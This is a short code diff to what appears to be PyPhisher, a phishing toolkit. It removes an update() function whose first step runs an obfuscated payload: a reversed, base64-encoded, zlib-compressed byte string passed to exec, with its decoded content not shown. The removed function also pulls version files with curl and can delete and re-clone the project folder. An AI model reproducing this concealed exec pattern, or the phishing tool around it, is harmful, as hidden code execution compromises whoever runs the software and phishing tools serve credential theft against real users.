@@ -155,30 +155,7 @@ def killer():
     if system("pidof unzip > /dev/null 2>&1")==0:
         system("killall unzip")
 
-# Update of PyPhisher
-def update():
-    internet()
-    _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=UhGYtKAu00QNIBzKStsw2UJFRFl8TehcQM1SKupwy3ll0mI8LqoU3oE8ysoCKugAIl40WT10Sl0UpUKN9iyOwiTyDV0Lx8yLd9zPlMyR9yyIPFTLzJe'))
-    git_ver=popen("curl -s -N https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/version.txt").read().strip()
-    if (version != git_ver and git_ver != "404: Not Found"):
-        changelog=popen("curl -s -N https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/changelog.log").read()
-        system("clear")
-        print(logo)
-        print(f"{info}PyPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}\n")
-        upask=input(ask+"Do you want to update PyPhisher?[y/n] > "+green)
-        if upask=="y":
-            print(nc)
-            system("cd .. && rm -rf PyPhisher pyphisher && git clone https://github.com/KasRoudra/PyPhisher")
-            sprint("\n"+success+"PyPhisher updated successfully!! Please restart terminal!\n")
-            if (changelog != "404: Not Found"):
-                print(info2+"Changelog:\n"+purple+changelog)
-            exit()
-        elif upask=="n":
-            print("\n"+info+"Updating cancelled. Using old version!")
-            sleep(2)
-        else:
-            print("\n"+error+"Wrong input!\n")
-            sleep(2)
+
 
 # Print logo
 def slowprint(n):
